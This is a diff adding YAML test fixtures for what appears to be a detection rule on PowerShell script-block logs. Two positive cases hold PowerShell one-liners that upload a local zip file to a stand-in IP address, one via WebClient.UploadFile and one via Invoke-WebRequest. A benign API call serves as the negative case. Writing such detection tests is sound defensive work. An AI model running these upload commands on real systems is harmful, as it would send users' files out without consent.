@@ -1,0 +1,33 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, code: '4104'}
+    powershell:
+      file: {script_block_text: '(New-Object Net.WebClient).UploadFile("http://203.0.113.9/up","C:\a.zip")'}
+    process: {name: powershell.exe}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, code: '4104'}
+    powershell:
+      file: {script_block_text: 'Invoke-WebRequest -Uri http://203.0.113.9 -Method Post -InFile C:\a.zip'}
+    process: {name: powershell.exe}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, code: '4104'}
+    powershell:
+      file: {script_block_text: 'Invoke-RestMethod https://api.x.com/v1/items'}
+    process: {name: powershell.exe}
